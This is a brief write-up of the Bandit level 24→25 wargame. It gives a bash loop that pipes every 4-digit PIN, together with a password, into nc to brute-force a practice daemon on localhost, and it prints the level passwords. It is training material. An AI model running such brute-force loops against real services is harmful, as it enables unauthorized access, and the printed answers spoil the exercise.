# 🧭 Bandit Level 24 → 25

## 🎯 Level Goal
> A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.  
You do not need to create new connections each time

---
## 📂 Key Commands Used

```
pass="gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8" 
for pin in $(seq -w 0000 9999); do
  echo "$pass $pin"
done | nc localhost 30002 | tee result.txt
```

---
## 🧠 Takeaways

- Used this script and `bash` to bruteforce my way and stop once the password was found.

---
## 🔐 Password for Level 25
``
```
iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
```

---